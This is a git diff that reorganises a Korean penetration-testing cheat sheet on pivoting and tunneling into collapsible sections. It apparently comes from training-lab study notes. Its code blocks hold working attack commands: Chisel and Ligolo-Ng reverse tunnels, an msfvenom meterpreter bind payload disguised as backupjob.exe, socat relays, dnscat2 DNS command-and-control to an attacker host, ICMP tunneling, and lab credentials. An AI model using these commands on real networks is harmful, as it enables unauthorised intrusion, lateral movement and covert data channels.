@@ -1,5 +1,5 @@
-# Pivoting, Tunneling, and Port Forwarding
-## 기본 설정 및 개념
+<details>
+  <summary><strong>기본 설정 및 개념</strong></summary>
 
 ### ProxyChains 설정
 - `/etc/proxychains4.conf`에서 socks5로 작동을 안할시에 socks4로 바꿔서 실행해볼 것.
@@ -16,8 +16,13 @@ netstat -r
 # 간단한 ping sweep으로 활성 호스트 찾기
 for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 ```
+  
+</details>
+
 ---
-## Ligolo-Ng
+<details>
+  <summary><strong>Ligolo-Ng</strong></summary>
+
 ```bash
 # server
 sudo ip tuntap add user root mode tun ligolo
@@ -53,8 +58,12 @@ ip route list
 # ligolo-ng
 start
 ```
+  
+</details>
+
 ---
-## Chisel
+<details>
+  <summary><strong>Chisel</strong></summary>
 
 ### Forward Proxy 모드
 ```bash
@@ -81,10 +90,12 @@ sudo ./chisel server --reverse -v -p 1234 --socks5
 # ProxyChains를 통한 접근
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
+  
+</details>
 
 ---
-
-## SSH Tunneling
+<details>
+  <summary><strong>SSH Tunneling</strong></summary>
 
 ### Local Port Forwarding
 ```bash
@@ -132,10 +143,12 @@ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 # 리스너 실행
 nc -nvlp 8000
 ```
+  
+</details>
 
 ---
-
-## Socat
+<details>
+  <summary><strong>Socat</strong></summary>
 
 ### 기본 포트 포워딩
 ```bash
@@ -153,19 +166,23 @@ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 # bind shell 연결을 위한 포트 포워딩
 socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 ```
+  
+</details>
 
 ---
-
-## Windows Plink
+<details>
+  <summary><strong>Windows Plink</strong></summary>
 
 ```powershell
 # Windows에서 SSH 동적 포트 포워딩 (SOCKS 프록시)
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
+  
+</details>
 
 ---
-
-## sshuttle
+<details>
+  <summary><strong>sshuttle</strong></summary>
 
 ```bash
 # VPN과 유사한 투명한 프록시 생성
@@ -175,10 +192,12 @@ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 # 직접 nmap 스캔 가능 (proxychains 불필요)
 sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
 ```
+  
+</details>
 
 ---
-
-## Rpivot
+<details>
+  <summary><strong>Rpivot</strong></summary>
 
 ```bash
 # 리포지토리 클론
@@ -196,10 +215,12 @@ python2.7 client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 
 # ProxyChains를 통한 접근
 proxychains firefox-esr 172.16.5.135:80
 ```
+  
+</details>
 
 ---
-
-## Netsh.exe
+<details>
+  <summary><strong>Netsh.exe</strong></summary>
 
 ```powershell
 # 포트 프록시 규칙 추가
@@ -214,10 +235,12 @@ netsh.exe interface portproxy show v4tov4
 xfreerdp3 /v:10.129.15.150:8080 /u:victor /p:pass@123
 ```
 - netsh.exe는 windows 내장 프로그램임.
+  
+</details>
 
 ---
-
-## DNS Proxy (dnscat2)
+<details>
+  <summary><strong>DNS Proxy (dnscat2)</strong></summary>
 
 ### 서버 설정 (공격자 머신)
 ```bash
@@ -244,10 +267,12 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 # 세션 윈도우로 전환 (세션 ID 1)
 dnscat2> window -i 1
 ```
+  
+</details>
 
 ---
-
-## Ptunnel-ng
+<details>
+  <summary><strong>Ptunnel-ng</strong></summary>
 
 ### 설정 및 설치
 ```bash
@@ -279,3 +304,5 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 # ProxyChains를 통한 스캔
 proxychains nmap -sV -sT 172.16.5.19 -p3389
 ```
+  
+</details>
